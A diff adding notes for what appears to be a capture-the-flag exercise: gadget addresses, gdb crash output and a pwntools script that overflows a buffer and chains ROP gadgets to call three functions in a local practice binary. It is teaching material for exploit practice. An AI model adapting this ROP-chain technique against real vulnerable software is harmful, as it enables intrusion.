@@ -1,0 +1,117 @@
+arg1:	0xdeadbeefdeadbeef
+arg2:	0xcafebabecafebabe
+arg3:	0xd00df00dd00df00d
+
+reloc:	callme_one	0x00601040
+reloc:	callme_two	0x00601050
+reloc:	callme_three	0x00601028
+
+pop_rdi: 0x0040093c
+pop_rsi: 0x0040093d
+pop_rdx: 0x0040093e
+ret:	 0x0040093f
+
+NOTES:
+
+rdi: First arg register
+rsi: Second arg register
+rdx: Third arg register
+rcx: Fourth arg register
+r8:  Fifth arg register
+r9:  Sixth arg register
+
+Write-Up:
+	Filling The Buffer:
+		Using gdb with pwntools installed the number of bytes to overflow the buffer can be found easily
+		Running the cyclic command within gdb will generate a string of characters to assist in identifying the size of the buffer
+			The command will generate a string that looks like:
+				aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
+		running the program and using this string will crash the program and gdb will display the contents of the register
+			*RAX  0xb
+			*RBX  0x400940 (__libc_csu_init) ◂— push r15
+			*RCX  0x7ffff7cc9077 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+			 RDX  0x0
+			*RDI  0x7ffff7da97e0 (_IO_stdfile_1_lock) ◂— 0x0
+			*RSI  0x7ffff7da8723 (_IO_2_1_stdout_+131) ◂— 0xda97e0000000000a /* '\n' */
+			*R8   0xb
+			*R9   0x2
+			*R10  0xfffffffffffff549
+			*R11  0x246
+			*R12  0x400760 (_start) ◂— xor ebp, ebp
+			*R13  0x7fffffffe0b0 ◂— 0x1
+			 R14  0x0
+			 R15  0x0
+			*RBP  0x6161616161616165 ('eaaaaaaa')
+			*RSP  0x7fffffffdfb8 ◂— 'faaaaaaaga\n'
+			*RIP  0x4008f1 (pwnme+89) ◂— ret
+		The register we are interested in is the RSP register which currently has the value of faaaaaaaga
+		Using the cyclic command again we can determine the size of the buffer by running 
+			cyclic -l faaaaaaa
+		This will output the result of 38 bytes, adding the two extra bytes at the end we get a buffer size of 40 bytes
+	
+	Targeting the Functions:
+		In this challange we have to run three functions and pass arguments
+		The commands being targeted are callme_one() callme_two() callme_three()
+			These commands can be found at : 
+				callme_one():	0x00400720
+				callme_two():	0x00400740
+				callme_three():	0x004006f0
+		When looking at these functions there are three arguments already loaded so theyll have to be cleared before the function is called to run properly
+		
+		In order to remove these values we need to find a ROP gadget to pop the registry
+		There are a few ways to do this, either using ropper or radare2 
+			using ropper you just pass the file name and it'll list all the ROP gadgets in the binary
+			using radare2 use the /R command and the gadget youre looking for
+				/R pop rdi
+		Using either of these commands will yield a gadget that pops the RDI,RSI,RDX registrys
+			The address of the gadget can be found at: 0x0040093c
+		This'll allow us to remove the default arguments and pass our own to the binary
+		
+		After the arguments are popped we can load our own custom arguments into the ROP string
+		This can be done by passing the hex representation of the string in little-endian
+	
+	Creating the exploit:
+		By chaining the padding and the addresses found earlier a ROP chain can be created to pop the registers and call the function with the correct arguments
+		
+			#!/usr/bin/python
+			from pwn import *
+
+			p = process('./callme')
+
+			#arguments
+			arg1 = p64(0xdeadbeefdeadbeef)
+			arg2 = p64(0xcafebabecafebabe)
+			arg3 = p64(0xd00df00dd00df00d)
+
+			all_args = arg1 + arg2 + arg3
+
+			#pop registers
+			pop_args = p64(0x0040093c)
+			pop_reg = pop_args
+
+			#function calls
+			callme_one = p64(0x00400720)
+			callme_two = p64(0x00400740)
+			callme_three = p64(0x004006f0)
+
+			#chain creation
+			payload = b"A"*40 #Create padding
+
+			payload += pop_args # Callme_one
+			payload += all_args
+			payload += callme_one
+
+			payload += pop_args # Callme_two
+			payload += all_args
+			payload += callme_two
+
+			payload += pop_args # Callme_three
+			payload += all_args
+			payload += callme_three
+
+			#pass chain to program
+			#print(payload)
+			p.sendline(payload)
+
+			response = p.recvall()
+			print(response)
